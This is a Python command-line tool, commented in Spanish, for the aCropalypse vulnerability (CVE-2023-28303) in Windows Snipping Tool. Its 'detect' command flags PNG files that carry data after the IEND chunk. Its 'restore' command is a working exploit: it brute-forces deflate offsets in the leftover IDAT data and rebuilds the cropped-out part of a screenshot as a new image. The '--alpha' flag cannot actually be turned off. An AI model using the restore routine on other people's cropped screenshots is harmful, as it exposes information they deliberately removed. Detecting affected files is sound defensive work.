#!/usr/bin/env python3
"""
SnipRecover CLI sirve para detectar y restaurar PNGs afectados por la vulnerabilidad
Windows Snipping Tool (CVE-2023-28303), sin interfaz gráfica.

Defaults:
  • Resolución: 1920×1080
  • Canal alfa: habilitado (RGBA)
  • Si no se especifica --output, guarda como restored-<nombre>.png
"""
import argparse
import os
import sys
import zlib
import io
import struct

PNG_SIGNATURE = b"\x89PNG\r\n\x1a\n"

def parse_png_chunk(stream):
    length_data = stream.read(4)
    if len(length_data) < 4:
        return None, None
    length = struct.unpack(">I", length_data)[0]
    chunk_type = stream.read(4)
    data = stream.read(length)
    crc = stream.read(4)
    return chunk_type, data


def pack_png_chunk(stream, chunk_type, data):
    stream.write(struct.pack(">I", len(data)))
    stream.write(chunk_type)
    stream.write(data)
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    stream.write(struct.pack(">I", crc))


def detect_file(path):
    try:
        data = open(path, "rb").read()
    except OSError:
        return None
    if not data.startswith(PNG_SIGNATURE):
        return False
    pos = data.find(b"IEND")
    if pos < 0:
        return False
    length = struct.unpack(">I", data[pos-4:pos])[0]
    end = pos - 4 + 4 + length + 4
    return len(data) > end


def print_status(path, vulnerable):
    if vulnerable is None:
        print(f"[ERROR] {path}")
    elif vulnerable:
        print(f"[VULNERABLE] {path}")
    else:
        print(f"[OK] {path}")


def detect(args):
    target = args.path
    if os.path.isfile(target):
        ok = detect_file(target)
        print_status(target, ok)
    elif os.path.isdir(target):
        for root, _, files in os.walk(target):
            for fname in files:
                if fname.lower().endswith('.png'):
                    full = os.path.join(root, fname)
                    ok = detect_file(full)
                    print_status(full, ok)
    else:
        print(f"[ERROR] Ruta no encontrada: {target}", file=sys.stderr)
        sys.exit(1)


def reconstruct_image(input_file, img_width, img_height, use_alpha, output_file):
    # Leer hasta IEND
    with open(input_file, "rb") as f:
        sig = f.read(len(PNG_SIGNATURE))
        if sig != PNG_SIGNATURE:
            raise ValueError("No es un PNG válido")
        while True:
            ctype, _ = parse_png_chunk(f)
            if ctype == b"IEND": break
        trailer = f.read()

    # Buscar IDAT en trailer
    try:
        idx = trailer.index(b"IDAT", 12)
    except ValueError:
        raise ValueError("No se encontraron bloques IDAT tras IEND")

    raw = trailer[12:idx-8]
    stream = io.BytesIO(trailer[idx-4:])
    full_idat = b""
    while True:
        ctype, body = parse_png_chunk(stream)
        if ctype == b"IDAT":
            full_idat += body
        elif ctype == b"IEND":
            break
        else:
            raise ValueError(f"Chunk inesperado: {ctype}")
    full_idat = full_idat[:-4]  # quitar adler32

    # Convertir a bits
    bits = []
    for b in full_idat:
        for i in range(8): bits.append((b >> i) & 1)
    bits.extend([0]*7)

    # Generar variantes
    variants = []
    for offset in range(8):
        arr = bytearray()
        for j in range(offset, len(bits)-7, 8):
            val = 0
            for k in range(8): val |= bits[j+k] << k
            arr.append(val)
        variants.append(bytes(arr))

    prefix_len = 0x8000
    prefix = (b"\x00" + prefix_len.to_bytes(2, 'little') +
              (prefix_len ^ 0xFFFF).to_bytes(2, 'little') + b"\x00"*prefix_len)

    decompressed = None
    for i in range(len(full_idat)):
        chunk = variants[i % 8][i//8:]
        if not chunk or (chunk[0] & 7) != 0b100: continue
        d = zlib.decompressobj(wbits=-15)
        try:
            out = d.decompress(prefix + chunk) + d.flush(zlib.Z_FINISH)
            out = out[prefix_len:]
            if d.eof and d.unused_data in (b"", b"\x00"):
                decompressed = out
                break
        except zlib.error:
            continue
    if decompressed is None:
        raise ValueError("No se pudo restaurar la imagen: sin parse válido")

    # Escribir PNG restaurado
    with open(output_file, "wb") as out:
        out.write(PNG_SIGNATURE)
        ihdr = struct.pack(">II5B", img_width, img_height, 8,
                           6 if use_alpha else 2, 0, 0, 0)
        pack_png_chunk(out, b"IHDR", ihdr)
        if use_alpha:
            row = b"\x00" + b"\xff\x00\xff\xff"*img_width
        else:
            row = b"\x00" + b"\xff\x00\xff"*img_width
        base = bytearray(row * img_height)
        base[-len(decompressed):] = decompressed
        comp = zlib.compress(base)
        pack_png_chunk(out, b"IDAT", comp)
        pack_png_chunk(out, b"IEND", b"")


def restore(args):
    infile = args.input
    width = args.width
    height = args.height
    alpha = args.alpha
    outfile = args.output or f"restored-{os.path.splitext(os.path.basename(infile))[0]}.png"
    try:
        reconstruct_image(infile, width, height, alpha, outfile)
        print(f"[RESTORED] {outfile}")
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        sys.exit(2)


def main():
    parser = argparse.ArgumentParser(
        description="CLI Acropalypse: detectar y restaurar PNG vulnerables CVE-2023-28303")
    sub = parser.add_subparsers(dest='cmd', required=True)

    d = sub.add_parser('detect', help='Detectar PNGs vulnerables en archivo o carpeta')
    d.add_argument('path', help='Archivo o carpeta a escanear')

    r = sub.add_parser('restore', help='Restaurar PNG recortado por Snipping Tool')
    r.add_argument('input', help='PNG recortado a restaurar')
    r.add_argument('--width', type=int, default=1920, help='Ancho original (default: 1920)')
    r.add_argument('--height', type=int, default=1080, help='Alto original (default: 1080)')
    r.add_argument('--alpha', action='store_true', default=True, help='Incluir canal alfa (RGBA)')
    r.add_argument('--output', help='Ruta de salida (default: restored-<name>.png)')

    args = parser.parse_args()
    if args.cmd == 'detect':
        detect(args)
    else:
        restore(args)

if __name__ == '__main__':
    main()
